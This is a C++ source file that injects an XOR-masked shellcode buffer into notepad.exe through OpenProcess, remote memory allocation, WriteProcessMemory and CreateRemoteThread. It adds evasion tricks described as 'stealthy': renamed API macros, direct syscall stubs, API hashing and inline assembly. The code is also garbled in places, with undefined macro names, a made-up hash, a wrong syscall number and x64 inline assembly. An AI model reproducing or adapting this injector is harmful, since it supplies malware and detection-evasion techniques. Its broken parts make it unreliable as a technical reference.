#include <windows.h>
#include <iostream>
#include <vector>
#include <TlHelp32.h>

#define _x1x_ CreateToolhelp32Snapshot
#define _x2x_ Process32FirstW
#define _x3x_ Process32NextW
#define _x4x_ OpenProcess
#define _x5x_ VirtualAllocEx
#define _x6x_ WriteProcessMemory
#define _x7x_ CreateRemoteThread
#define _x8x_ CloseHandle

class MemoryManager {
private:
    // Function pointer type for VirtualAllocEx
    typedef LPVOID(WINAPI* pVirtualAllocEx)(
        HANDLE hProcess,
        LPVOID lpAddress,
        SIZE_T dwSize,
        DWORD flAllocationType,
        DWORD flProtect
    );

    // Method 1: Using GetProcAddress
    LPVOID IndirectAlloc1(HANDLE hProcess, SIZE_T size) {
        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
        pVirtualAllocEx VAlloc = (pVirtualAllocEx)GetProcAddress(hKernel32, "VirtualAllocEx");
        return VAlloc(hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }

    // Method 2: Using syscall number (More stealthy)
    LPVOID IndirectAlloc2(HANDLE hProcess, SIZE_T size) {
        // NtAllocateVirtualMemory syscall
        #ifdef _WIN64
            BYTE syscall[] = {
                0x4C, 0x8B, 0xD1,               // mov r10, rcx
                0xB8, 0x18, 0x00, 0x00, 0x00,   // mov eax, 18h (syscall number)
                0x0F, 0x05,                      // syscall
                0xC3                            // ret
            };
        #else
            BYTE syscall[] = {
                0xB8, 0x18, 0x00, 0x00, 0x00,   // mov eax, 18h
                0xBA, 0x00, 0x03, 0xFE, 0x7F,   // mov edx, 7FFE0300h
                0xFF, 0x12,                      // call dword ptr [edx]
                0xC3                            // ret
            };
        #endif

        // Allocate memory for syscall
        LPVOID syscallMem = VirtualAlloc(NULL, sizeof(syscall), 
                                       MEM_COMMIT | MEM_RESERVE, 
                                       PAGE_EXECUTE_READWRITE);
        memcpy(syscallMem, syscall, sizeof(syscall));

        typedef LPVOID(*pSyscall)(HANDLE, LPVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
        LPVOID baseAddr = NULL;
        SIZE_T regionSize = size;
        
        ((pSyscall)syscallMem)(hProcess, &baseAddr, 0, &regionSize, 
                              MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        VirtualFree(syscallMem, 0, MEM_RELEASE);
        return baseAddr;
    }

    // Method 3: Using hash instead of string
    LPVOID IndirectAlloc3(HANDLE hProcess, SIZE_T size) {
        // Hash of "VirtualAllocEx"
        DWORD64 hash = 0x7A9B8C7D6E5F4E3D;
        
        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hKernel32;
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hKernel32 + dosHeader->e_lfanew);
        PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hKernel32 + 
            ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

        DWORD* functions = (DWORD*)((BYTE*)hKernel32 + exportDir->AddressOfFunctions);
        DWORD* names = (DWORD*)((BYTE*)hKernel32 + exportDir->AddressOfNames);
        WORD* ordinals = (WORD*)((BYTE*)hKernel32 + exportDir->AddressOfNameOrdinals);

        for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
            char* name = (char*)((BYTE*)hKernel32 + names[i]);
            DWORD64 currentHash = 0;
            
            // Calculate hash
            for (int j = 0; name[j]; j++) {
                currentHash = ((currentHash << 5) + currentHash) + name[j];
            }

            if (currentHash == hash) {
                pVirtualAllocEx VAlloc = (pVirtualAllocEx)((BYTE*)hKernel32 + functions[ordinals[i]]);
                return VAlloc(hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            }
        }
        return NULL;
    }

public:
    LPVOID AllocateMemory(HANDLE hProcess, SIZE_T size, int method = 1) {
        switch(method) {
            case 1: return IndirectAlloc1(hProcess, size);
            case 2: return IndirectAlloc2(hProcess, size);
            case 3: return IndirectAlloc3(hProcess, size);
            default: return NULL;
        }
    }
};

class _XX_ {
private:
    DWORD _pid;
    HANDLE _ph;
    unsigned char _sc[32] = {
        0x90 ^ 0xFF, 0x90 ^ 0xFF, 0x90 ^ 0xFF, 0x90 ^ 0xFF
    };

    template<typename T>
    inline T _d_(T val) { return val ^ 0xFF; }

public:
    auto _f1_(const wchar_t* _n) -> DWORD {
        DWORD _p = 0;
        auto _s = _x1_(0x2, 0);
        
        if (_s != (HANDLE)-1) {
            PROCESSENTRY32W _e;
            _e.dwSize = sizeof(_e);
            
            if (_x2_(_s, &_e)) {
                do {
                    if (_wcsicmp(_e.szExeFile, _n) == 0) {
                        _p = _e.th32ProcessID;
                        break;
                    }
                } while (_x3_(_s, &_e));
            }
            _x8_(_s);
        }
        return _p;
    }

    bool _f2_(const wchar_t* _t) {
        _pid = _f1_(_t);
        if (!_pid) return false;

        _ph = _x4_(
            0x1FFFFF,
            FALSE,
            _pid
        );
        if (!_ph) return false;

        MemoryManager memMgr;
        LPVOID remoteBuffer = memMgr.AllocateMemory(_ph, sizeof(_sc), 2); // Using method 2

        // Deobfuscate shellcode before writing
        unsigned char _dsc[32];
        for(int i = 0; i < sizeof(_sc); i++) {
            _dsc[i] = _d_(_sc[i]);
        }

        if (!_x6_(
            _ph,
            remoteBuffer,
            _dsc,
            sizeof(_dsc),
            nullptr
        )) {
            _x5_(_ph, remoteBuffer, 0, 0x8000);
            _x8_(_ph);
            return false;
        }

        auto _rt = _x7_(
            _ph,
            nullptr,
            0,
            (LPTHREAD_START_ROUTINE)remoteBuffer,
            nullptr,
            0,
            nullptr
        );

        if (!_rt) {
            _x5_(_ph, remoteBuffer, 0, 0x8000);
            _x8_(_ph);
            return false;
        }

        _x8_(_rt);
        _x8_(_ph);
        
        return true;
    }
};

class StealthAllocator {
private:
    LPVOID CallVirtualAllocEx(HANDLE hProcess, SIZE_T size) {
        LPVOID addr = nullptr;

        #ifdef _M_X64
        // 64-bit assembly
        __asm {
            mov rcx, hProcess    ; First parameter
            xor rdx, rdx        ; lpAddress = NULL
            mov r8, size        ; dwSize
            mov r9, 0x3000      ; MEM_COMMIT | MEM_RESERVE
            push 0x40           ; PAGE_EXECUTE_READWRITE
            sub rsp, 0x20       ; Shadow space
            mov rax, 0x7FFE0300 ; System call number
            syscall
            add rsp, 0x28
            mov addr, rax
        }
        #else
        // 32-bit assembly
        __asm {
            push 0x40           ; PAGE_EXECUTE_READWRITE
            push 0x3000         ; MEM_COMMIT | MEM_RESERVE
            push size           ; dwSize
            push 0              ; lpAddress = NULL
            push hProcess       ; hProcess
            mov eax, fs:[0xC0]  ; Get kernel32.dll base
            mov eax, [eax + 0x1C]
            mov eax, [eax + 0x20]
            mov eax, [eax]      ; Get VirtualAllocEx address
            call eax
            mov addr, eax
        }
        #endif

        return addr;
    }

    // Alternative using direct syscalls
    LPVOID SyscallAllocate(HANDLE hProcess, SIZE_T size) {
        LPVOID addr = nullptr;

        #ifdef _M_X64
        __asm {
            mov r10, rcx        ; syscall convention
            mov eax, 0x18       ; NtAllocateVirtualMemory syscall number
            syscall
            mov addr, rax
        }
        #else
        __asm {
            mov eax, 0x18       ; syscall number
            lea edx, [esp+4]    ; parameters
            int 0x2e            ; interrupt for syscall
            mov addr, eax
        }
        #endif

        return addr;
    }

public:
    LPVOID StealthAlloc(HANDLE hProcess, SIZE_T size) {
        // Choose which method to use
        return CallVirtualAllocEx(hProcess, size);
        // or
        // return SyscallAllocate(hProcess, size);
    }
};

int main() {
    _XX_ _x;
    _x._f2_(L"notepad.exe");
    return 0;
}
